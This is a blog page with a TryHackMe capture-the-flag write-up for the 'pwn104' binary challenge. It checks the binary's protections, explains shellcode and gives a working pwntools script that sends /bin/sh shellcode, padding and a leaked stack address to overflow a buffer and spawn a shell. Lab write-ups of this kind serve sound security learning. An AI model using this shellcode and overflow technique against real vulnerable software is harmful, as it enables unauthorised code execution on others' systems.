<!DOCTYPE html>
<html class="no-js" lang="en-us">
<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#1b1b1b">
	<title>pwn104 | Dexter</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		
  <meta itemprop="name" content="pwn104">
  <meta itemprop="description" content="104 Introduction First of all we are going to do some file checks, to see the binary protections and determine the file type
pwn104.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped We can see that the binary is a 64 bit Least Significant Byte executable, in other words it uses little endian. The binary is dynamically linked to a LIBC and it is not stripped.">
  <meta itemprop="datePublished" content="2024-01-10T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-01-10T00:00:00+00:00">
  <meta itemprop="wordCount" content="542">
  <meta itemprop="keywords" content="Tryhackme">
	<link rel="stylesheet" href="/blog/css/bundle.css">
	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
</head>
<body class="body kind-page">
	<header class="header">
	<a class="logo" href="/blog/">Dexter</a>
	
</header>
	<div class="primary">
	
	<main class="main">
		
		<div class="single block">
			<article class="entry">
				<h1 class="entry__title">pwn104</h1>
<details class="entry__toc toc" open>
	<summary class="toc__title">Table of Contents</summary>
	<nav id="TableOfContents">
  <ul>
    <li><a href="#104">104</a>
      <ul>
        <li><a href="#introduction">Introduction</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
  </ul>
</nav>
</details>
				<div class="entry__content"><h2 id="104">104</h2>
<h3 id="introduction">Introduction</h3>
<p>First of all we are going to do some file checks, to see the binary protections and determine the file type</p>
<pre tabindex="0"><code>pwn104.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
</code></pre><p>We can see that the binary is a 64 bit Least Significant Byte executable, in other words it uses little endian. The binary is dynamically linked to a LIBC and it is not stripped.</p>
<pre tabindex="0"><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
</code></pre><p>we can also see the protections around it, you can refer back to pwn103 above to see what this protections mean.</p>
<p>So interesting enough we can see that under NX, it is unknown, this could potentialy mean that we can execute shellcode on the stack. Running the binary may confirm this</p>
<pre tabindex="0"><code>I think I have some super powers üí™
especially executable powers üòéüí•

Can we go for a fight? üòèüí™
I&#39;m waiting for you at 0x7ffe12e976e0
</code></pre><p>So what is shellcode? Shellcode is essentially machine code designed to be injected and executed as part of a larger software system. It&rsquo;s commonly used in exploits to achieve various goals, often to spawn a shell or grant unauthorized access to a system. Let&rsquo;s delve deeper into how shellcode works:
Anatomy of Shellcode:</p>
<pre><code>Assembly Instructions:
    Shellcode comprises low-level assembly instructions, usually handcrafted or generated by specialized tools like shellcraft or extracted from shellcode databases.
    These instructions are often minimal and aim to perform specific tasks such as spawning a shell (/bin/sh) or executing system commands.

Functionality:
    The shellcode's primary function is to manipulate the program's flow or system resources to achieve a specific goal, like gaining unauthorized access or spawning a shell.
    Common shellcode tasks include modifying memory, calling system functions, or executing shell commands by taking advantage of vulnerabilities in the target program.
</code></pre>
<p>In an exploit scenario, shellcode is injected into a vulnerable program and usually occurs through buffer overflows or other vulnerabilities that allow arbitiary code execution. The shellcode is set to overwrite specific memory region, such as the return address or function pointers, to redirect the program flow. Once injected and executed, the shellcode&rsquo;s instructions start running within the context of the compromised program. The shellcode typically performs its predefined tasks, which could involve spawning a shell, granting escalated privileges, or executing specific commands.</p>
<h3 id="exploit">Exploit</h3>
<p>So we can see that the program gives us some address so we can maybe grab that and this location could be where we can execute shellcode</p>
<p>Next we are going to need shellcode, so there are two ways to get shellcode. One way being using shellcraft which is a tool which generates shellcode, the other way is using the shellcode database.</p>
<p>Here i am going to get one from the database <a href="http://shell-storm.org/shellcode/files/shellcode-603.html">shellstrom</a></p>
<p>Smooth, next we need to fill the buffer which will allow us to execute shellcode.</p>
<pre tabindex="0"><code>from pwn import *

p = process(&#34;./pwn104.pwn104&#34;)
#p = remote(thm_ip, 9004)


p.recvuntil(b&#39;at &#39;)
output = p.recv()
print(output)
bufferlocation = p64(int(output, 16))
shellcode = b&#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39;

payload = shellcode
payload += b&#39;A&#39; * (88 - len(shellcode))
payload += bufferlocation

p.sendline(payload)
p.interactive()
</code></pre><p>You can use also use shellcraft to create your payload.</p>
</div>
				
				<footer class="entry__footer">
					
<div class="entry__tags">
			<a class="entry__tag btn" href="/blog/tags/tryhackme/">Tryhackme</a>
</div>
					
<div class="entry__share share">
	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fthm%2fbinary104%2f&amp;text=pwn104" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
	</a>
	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fthm%2fbinary104%2f&title=pwn104" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
	</a>
</div>
				</footer>
				
			</article>
		</div>
	</main>
	
<div class="authorbox block">
	<div class="author">
		<div class="author__body">
			<div class="author__name">
				Dexter
			</div>
			<div class="author__bio">Just human</div>
		</div>
	</div>
</div>
	



<div class="related block">
	<h3 class="related__title">Related</h3>
	<ul class="related__list">
		
		<li class="related__item"><a class="related__link" href="/blog/posts/thm/binary102/">pwn102</a></li>
		
		<li class="related__item"><a class="related__link" href="/blog/posts/thm/binary103/">pwn103</a></li>
		
		<li class="related__item"><a class="related__link" href="/blog/posts/thm/binary101/">pwn101</a></li>
		
	</ul>
</div>

	

	</div>
	<footer class="footer">
<div class="footer__social social">
		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
		</a>
		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
		</a>
</div>
	<div class="footer__copyright">¬© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
</footer>
</body>
</html>